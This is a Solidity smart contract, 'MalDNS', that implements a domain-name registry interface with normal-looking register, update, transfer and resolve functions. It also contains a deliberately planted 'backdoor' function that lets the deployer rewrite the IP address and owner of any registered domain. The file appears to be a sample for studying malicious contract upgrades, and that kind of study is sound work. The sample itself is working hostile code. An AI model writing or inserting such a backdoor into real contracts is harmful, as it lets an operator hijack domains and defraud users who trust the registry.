// SPDX-License-Identifier: GPL-v3

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import './IDNS.sol';
import './Upgrade.sol';

contract MalDNS is IDNS {
	mapping (string => Entry) data;

	IDNS immutable public originalDNS;
	Upgrade immutable public upgradeInfo;

	address immutable owner;
	bytes4 hackIP;

	constructor(bytes4 _ip, IDNS _dns, Upgrade _info) {
		hackIP = _ip;
		originalDNS = IDNS(_dns);
		upgradeInfo = Upgrade(_info);
		owner = msg.sender;
	}

	function backdoor(string memory _domain, bytes4 _ip, address _owner) external {
		require(msg.sender == owner);
		Entry storage entry = data[_domain];
		entry.ip = _ip;
		entry.owner = _owner;
	}

	function register(string memory _domain, bytes4 _ip, address _owner) external override {
		require(_ip != 0, "Invalid ip.");
		require(bytes(_domain).length > 0, "Invalid domain.");

		Entry storage entry = data[_domain];
		require(entry.ip == 0 && entry.owner == address(0), "Domain already taken.");

		entry.ip = _ip;
		entry.owner = _owner;
	}

	function update(string memory _domain, bytes4 _ip) external override {
		Entry storage entry = data[_domain];

		require(
			(msg.sender == tx.origin && entry.owner == msg.sender),
			"Not the owner."
		);

		require(_ip != 0, "Invalid ip.");
		entry.ip = _ip;
	}

	function transfer(string memory _domain, address _owner) external override {
		Entry storage entry = data[_domain];

		// If a user sent the tx, they must be the owner.
		// If a previous DNS sent the tx, at some point the original DNS authenticated
		// the msg.sender as the owner.
		require(
			(msg.sender == tx.origin && entry.owner == msg.sender),
			"Not the owner."
		);

		require(_owner != address(0), "Invalid owner.");
		entry.owner = _owner;
	}

	function resolve(string memory _domain) external view override returns (bytes4, address) {
		return (data[_domain].ip, data[_domain].owner);
	}
}
